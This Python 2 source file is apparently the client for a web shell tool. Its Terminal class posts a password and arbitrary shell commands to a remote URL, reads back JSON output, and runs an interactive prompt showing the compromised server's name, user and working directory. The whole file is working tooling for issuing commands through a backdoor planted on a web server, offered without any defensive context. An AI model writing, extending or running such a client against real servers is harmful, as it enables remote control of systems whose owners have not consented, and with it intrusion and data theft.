import sys
import os
import urllib  
import json
import requests

from core.server import Server

class Terminal:

	def __init__(self,url,password):
		self.url = url
		self.password = password
		self.server = Server(url,password)

	def terminal(self,send,cookie):
		command = self.command(send)
		if command == False:
			return self.execute(send,cookie)

	def command(self,send):
		if send == "exit":
			print "\n#> Connection Closet by user."
			sys.exit(2)
		else:
			return False

	def execute(self,cmd,cookie):
		if self.server.beat():
			return json.loads(requests.post(self.url, data = {'pass': self.password,'cmd': cmd} ,cookies=cookie).text)
		
	def loop(self):
		server = self.server.connection()
		if server['response']:
			print "#> Conecction Established, Enjoy!\n"
			while True:
				info = self.server.info(server['cookie'])
				send = raw_input(info['server_name']+"@"+info['user']+"["+info['pwd'].rstrip('\n')+"]"+info['user_bash']+">")
				terminal = self.terminal(send,server['cookie'])
				print terminal['command']
		elif server['response'] == False:
			print "robot@shuffle[~]$> Response: "+server['msg']
		else:
			print "robot@shuffle[~]$> Connection fail."
